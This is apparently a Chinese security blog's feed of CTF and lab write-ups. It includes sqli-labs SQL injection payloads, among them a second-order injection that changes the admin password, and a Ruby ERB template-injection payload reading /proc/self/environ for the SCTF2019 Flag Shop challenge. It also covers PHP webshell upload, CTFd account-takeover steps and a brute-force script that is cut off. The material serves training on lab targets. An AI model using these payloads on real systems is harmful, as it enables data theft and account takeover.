<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191022163617.png" alt=""></p>
<blockquote>
<p>%3d应该是=号urldecode的结果</p>
</blockquote>
<p>接下来构造payload进行测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and 1&#x3D;1 --+    &#x2F;&#x2F;明文</span><br><span class="line">YWRtaW4nIGFuZCAxPTEgLS0r    &#x2F;&#x2F;密文</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191022163837.png" alt=""></p>
<p>根据SQL错误信息的提示，应该是少了一个<code>)</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;) and 1&#x3D;1#   &#x2F;&#x2F;明文</span><br><span class="line">YWRtaW4nKSBhbmQgMT0xIw&#x3D;&#x3D;    &#x2F;&#x2F;密文</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191022164053.png" alt=""></p>
<p>示例爆库paylaod：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-admin&#39;) union select 1,2,database()#</span><br><span class="line">LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<h3 id="Less-22-Cookie-injection-base64-encoded-double-quotes">Less-22 Cookie injection-base64 encoded-double quotes</h3>
<p>和less-21一样的，只需要使用双引号代替单引号<strong>再取掉括号</strong>即可。</p>
<p>样例payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-admin&quot; union select 1,2,database()#</span><br><span class="line">LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj</span><br></pre></td></tr></table></figure>
<h3 id="Less-23-GET-Error-bases-strip-comments">Less-23 GET-Error bases-strip comments</h3>
<p>多次输入发现这道题不能用注释符来注掉后面<code>Limit</code>语句，只能转而用单引号闭合的方式。</p>
<p>尝试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and &#39;</span><br></pre></td></tr></table></figure>
<p>发现SQL语句不报错，那么久可以使用联合查询：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,database(),3 and &#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191022170754.png" alt=""></p>
<p>爆表payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; or &#39;1&#39;&#x3D;&#39;</span><br></pre></td></tr></table></figure>
<h3 id="Less-24-POST-Second-Oder-Injections-Real-Treate-Stored-Injections">Less-24 POST-Second Oder Injections *Real Treate* Stored Injections</h3>
<p>首先注册一个新用户，用户名必须是<code>admin'#</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191022195226.png" alt=""></p>
<p>然后登录<code>admin'#</code>账号，并修改该账号的密码，但此时<strong>修改的就是admin的密码</strong>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191022195442.png" alt=""></p>
<p>这是因为：SQL语句变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE users SET passwd&#x3D;&quot;New_Pass&quot; WHERE username &#x3D;&#39;admin&#39; # &#39; AND password&#x3D;&#39;</span><br></pre></td></tr></table></figure>
<p>也就是执行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE users SET passwd&#x3D;&quot;New_Pass&quot; WHERE username &#x3D;&#39;admin&#39;</span><br></pre></td></tr></table></figure>
<p>再可以去后台的数据库查看users表的记录：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191022195646.png" alt=""></p>
<p>发现账号<code>admin</code>的密码被更改了！！！</p>
<p>二次注入成功。</p>
<h3 id="Less-25-Get-Error-based-All-you-OR-AND-belong-to-us-string-single-quote">Less-25 Get-Error based-All you OR &amp; AND belong to us - string single quote</h3>
<p>根据页面的提示，很明显程序把我们输入的<code>and</code>和<code>or</code>关键字过滤掉了。</p>
<p>解决方法就是双写<code>and</code>或<code>or</code>关键字，例如：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191024210809.png" alt=""></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf刷题——NodeJS</title>
    <url>/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS/</url>
    <content><![CDATA[<h2 id="GKCTF2020-EZ三剑客-EzNode">GKCTF2020 EZ三剑客-EzNode</h2>
<h2 id="GYCTF2020-Node-Game">GYCTF2020 Node Game</h2>
<h2 id="GKCTF2020-Node-Exe">GKCTF2020 Node-Exe</h2>
<h2 id="GYCTF2020-Ez-Express">GYCTF2020 Ez_Express</h2>
<h2 id="HFCTF2020-EasyLogin">HFCTF2020 EasyLogin</h2>
<h2 id="HFCTF2020-JustEscape">HFCTF2020 JustEscape</h2>
]]></content>
      <categories>
        <category>CTF</category>
        <category>NodeJS</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf刷题——Ruby及Go</title>
    <url>/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo/</url>
    <content><![CDATA[<h2 id="SCTF2019-Flag-Shop">SCTF2019 Flag Shop</h2>
<h3 id="考点">考点</h3>
<ul>
<li>JWT伪造</li>
<li>Ruby SSTI</li>
</ul>
<h3 id="解题">解题</h3>
<h4 id="解法1">解法1</h4>
<p>打开靶机，查看源代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;h1 style=<span class="string">&quot;text-align: center&quot;</span>&gt;Flag Shop&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">Your uid is &lt;b id=<span class="string">&quot;uid&quot;</span>&gt;&lt;/b&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">Your JinKela is &lt;b id=<span class="string">&quot;jkl&quot;</span>&gt;&lt;/b&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">Flag Price: <span class="xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span>1000000000000000000000000000<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">&lt;hr /&gt;</span><br><span class="line"></span><br><span class="line">&lt;button onclick=<span class="string">&quot;buyFlag()&quot;</span> style=<span class="string">&quot;text-align: left&quot;</span>&gt;buy flag&lt;/button&gt;</span><br><span class="line">&lt;button onclick=<span class="string">&quot;reset()&quot;</span> style=<span class="string">&quot;text-align: center&quot;</span>&gt;reset&lt;/button&gt;</span><br><span class="line">&lt;button onclick=<span class="string">&quot;work()&quot;</span> style=<span class="string">&quot;text-align: right&quot;</span>&gt;work&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">buyFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        fetch(<span class="string">&quot;/shop&quot;</span>, &#123;</span><br><span class="line">            method: <span class="string">&#x27;POST&#x27;</span>, <span class="comment">// or &#x27;PUT&#x27;</span></span><br><span class="line">            headers: <span class="keyword">new</span> Headers(&#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">            .then(<span class="function"><span class="params">res</span> =&gt;</span> res.text())</span><br><span class="line"></span><br><span class="line">            .then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">                    alert(response)</span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">            .catch(<span class="function"><span class="params">error</span> =&gt;</span>alert(error))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(confirm(<span class="string">&quot;This will reset all Jinkelas , Are U Sure?&quot;</span>))&#123;</span><br><span class="line">            fetch(<span class="string">&quot;/api/auth&quot;</span>);</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="built_in">window</span>.location.reload(),<span class="number">500</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        fetch(<span class="string">&quot;/work?name=bot&amp;do=bot is working&quot;</span>)</span><br><span class="line">            .then(<span class="function">()=&gt;</span><span class="built_in">window</span>.location.reload());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fetch(<span class="string">&quot;/api/info&quot;</span>,&#123;</span><br><span class="line">            redirect: <span class="string">&#x27;manual&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .then(<span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span>(res.ok)&#123;</span><br><span class="line">              <span class="keyword">return</span> res.json()</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span>&#123;</span><br><span class="line">              fetch(<span class="string">&quot;/api/auth&quot;</span>)</span><br><span class="line">              reject;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> info = res;</span><br><span class="line">            <span class="built_in">console</span>.log(info);</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;uid&quot;</span>).innerText = info.uid;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;jkl&quot;</span>).innerText = info.jkl;</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="built_in">window</span>.location.reload(),<span class="number">500</span>))</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>auth 之后会得到一个 jwt token。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815194238.png" alt=""></p>
<p>现在就需要找到secret。扫描站点，发现有filebak</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/cookies&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/json&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;jwt&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;securerandom&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE_<span class="number">_</span>) + <span class="string">&#x27;/static&#x27;</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">&quot;SECRET&quot;</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = File.new(File.dirname(__FILE_<span class="number">_</span>) + <span class="string">&#x27;/../log/http.log&#x27;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/&quot;</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">&#x27;/shop&#x27;</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/filebak&quot;</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb IO.binread __FILE_<span class="number">_</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/auth&quot;</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/info&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">&quot;uid&quot;</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;error&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;no enough jkl&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">&quot;FLAG&quot;</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;success&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;jkl is good thing&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">&#x27;/shop&#x27;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>重点关注work路由</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>可以看到 /work 那里有 ERB 模板，还直接把可控参数 name 拼进去了，那么这里我们就可以传入一些构造过的参数，来达到我们的目的了。但是限制了payload的长度为7。比如 <code>name=&lt;%=1%&gt;</code>，就会得 1。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815194455.png" alt=""></p>
<p>一些常规的SSTI注入由于长度的限制，最多只能由两个字符，肯定是行不通的。</p>
<p>对照 <a href="https://blog.csdn.net/zdq0394123/article/details/8443694">Ruby 全局变量表</a> ，不断 fuzz，发现<code>$</code>有东西</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815204424.png" alt=""></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>其在模板渲染之前之前有个匹配，就是这里。要是 SECRET 参数存在则对其进行匹配，用传入的这个值去和 <code>ENV[&quot;SECRET&quot;]</code> 匹配，匹配上了就往终端输出 FLAG。然后我们 SECRET 不传试试，这样括号里的匹配就不进行，只进行括号外的 <code>ENV[&quot;SECRET&quot;]</code> 的匹配，再用全局变量 <code>$</code> 就可以读出 <code>ENV[&quot;SECRET&quot;]</code> 了。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815204544.png" alt=""></p>
<h4 id="解法2">解法2</h4>
<p>HTTP参数传递类型差异产生的攻击面</p>
<p>先介绍一个trick</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">&quot;qwertyu&quot;</span></span><br><span class="line">$b = Array[<span class="string">&quot;bbb&quot;</span>,<span class="string">&quot;cc&quot;</span>,<span class="string">&quot;d&quot;</span>]</span><br><span class="line">puts <span class="string">&quot;$a: <span class="subst">#&#123;$a[<span class="number">0</span>,<span class="number">3</span>]&#125;</span>&quot;</span></span><br><span class="line">puts <span class="string">&quot;$b: <span class="subst">#&#123;$b[<span class="number">0</span>,<span class="number">3</span>]&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a: qwe</span><br><span class="line">$b: [&quot;bbb&quot;, &quot;cc&quot;, &quot;d&quot;]</span><br></pre></td></tr></table></figure>
<p>$b变量原本是数组，但是由于被拼接到了字符串中，所以数组做了一个默认的类型转换变成了<code>[&quot;bbb&quot;, &quot;cc&quot;, &quot;d&quot;]</code></p>
<p>有了这个trick，上面代码[0,7]从原本的限制7个字符突然变成了限制7个数组长度</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;work?SECRET&#x3D;a&amp;do&#x3D;[&quot;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working&amp;name[]&#x3D;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6</span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要对do参数urlencode编码</p>
</blockquote>
<h3 id="参考">参考</h3>
<p><a href="https://writeup.ctfhub.com/Challenge/2019/SCTF/34251.html">https://writeup.ctfhub.com/Challenge/2019/SCTF/34251.html</a></p>
<p><a href="https://evoa.me/archives/15/">https://evoa.me/archives/15/</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Ruby和Go</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf刷题——渗透测试篇</title>
    <url>/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87/</url>
    <content><![CDATA[<h1 id="BUUCTF——渗透测试篇">BUUCTF——渗透测试篇</h1>
<h2 id="GKCTF2020-老八小超市儿">GKCTF2020 老八小超市儿</h2>
<h3 id="考点">考点</h3>
<ul>
<li>弱口令登录</li>
<li>shopxo1.8.0 后台RCE</li>
</ul>
<h3 id="解题">解题</h3>
<p>没去想后台地址弱密码还是经验太少了</p>
<p>然后就是看传文件点，传个shell上去</p>
<p>但是文件具体在哪又找了半天</p>
<p>如果传在默认主题zip的<code>default/__static__/shell.php</code></p>
<p>那么访问路由应该是下面这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;shell.php</span><br></pre></td></tr></table></figure>
<p>getshell完了，根据提示，去找生成的脚本（因为这个脚本是由root权限+定时执行的）</p>
<p>改造下这个脚本，反弹shell或者直接执行cat命令，就拿到root权限了。</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200704124355.png" style="zoom:50%;" />
<h2 id="BJDCTF-2nd-Schrödinger">BJDCTF 2nd Schrödinger</h2>
<h3 id="考点-v2">考点</h3>
<ul>
<li>奇怪的考点</li>
</ul>
<h3 id="解题-v2">解题</h3>
<p>打开题目有一个<code>test.php</code>，是一个需要登录的网页，爆破的target应该就是这个<code>test.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200704212115.png" alt=""></p>
<p>并且Forecast success rate是根据JS代码来生成的，发现爆破很慢，抓包查看发现有个cookie是base64加密，解码之后很像时间戳，直接清空看看效果，发现直接99%，点击check，弹出来Bilibili的AV号。</p>
<p>根据时间查看评论得到flag。</p>
<blockquote>
<p>我还以为要去看北京大学 量子力学的视频呢</p>
</blockquote>
<h2 id="V-N-HappyCTFd">V&amp;N HappyCTFd</h2>
<h3 id="考点-v3">考点</h3>
<ul>
<li>CTFd 1day</li>
</ul>
<h3 id="解题-v3">解题</h3>
<p>考察的是CTFd v2.0.0 – v2.2.2 account takeover</p>
<p>可以直接看这篇分析：<a href="https://www.colabug.com/2020/0204/6940556/amp/">https://www.colabug.com/2020/0204/6940556/amp/</a></p>
<p>利用过程：</p>
<ul>
<li><strong>先在buuoj注册个邮箱</strong></li>
<li><strong>利用首尾添加空格绕过限制来注册一个与受害者用户名相同的账号</strong></li>
<li><strong>找回密码链接发送到自己的邮箱</strong></li>
<li><strong>修改自己账号的用户名（与受害者不同）</strong></li>
<li><strong>点击重置密码链接，设置新密码</strong></li>
</ul>
<h2 id="BJDCTF-2nd-elementmaster">BJDCTF 2nd elementmaster</h2>
<h3 id="考点-v4">考点</h3>
<ul>
<li>想象力</li>
</ul>
<h3 id="解题-v4">解题</h3>
<p>这道题真的有点脑洞大开了。。。。</p>
<p>打开题目有两个hide标签，id很可疑，感觉是Hex编码，用工具转换成ASCII拼接后是<code>Po.php</code>。</p>
<p>这里就要知道Po是一个化学元素，再结合题目和图片，把所有的化学元素都给遍历一遍。直接看别人的WP，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">periodic_table = (<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;He&#x27;</span>, <span class="string">&#x27;Li&#x27;</span>, <span class="string">&#x27;Be&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;Ne&#x27;</span>, <span class="string">&#x27;Na&#x27;</span>, <span class="string">&#x27;Mg&#x27;</span>, <span class="string">&#x27;Al&#x27;</span>, <span class="string">&#x27;Si&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;Cl&#x27;</span>, <span class="string">&#x27;Ar&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Ca&#x27;</span>, <span class="string">&#x27;Sc&#x27;</span>, <span class="string">&#x27;Ti&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;Cr&#x27;</span>, <span class="string">&#x27;Mn&#x27;</span>, <span class="string">&#x27;Fe&#x27;</span>, <span class="string">&#x27;Co&#x27;</span>, <span class="string">&#x27;Ni&#x27;</span>, <span class="string">&#x27;Cu&#x27;</span>, <span class="string">&#x27;Zn&#x27;</span>, <span class="string">&#x27;Ga&#x27;</span>, <span class="string">&#x27;Ge&#x27;</span>, <span class="string">&#x27;As&#x27;</span>, <span class="string">&#x27;Se&#x27;</span>, <span class="string">&#x27;Br&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;Kr&#x27;</span>, <span class="string">&#x27;Rb&#x27;</span>, <span class="string">&#x27;Sr&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Zr&#x27;</span>, <span 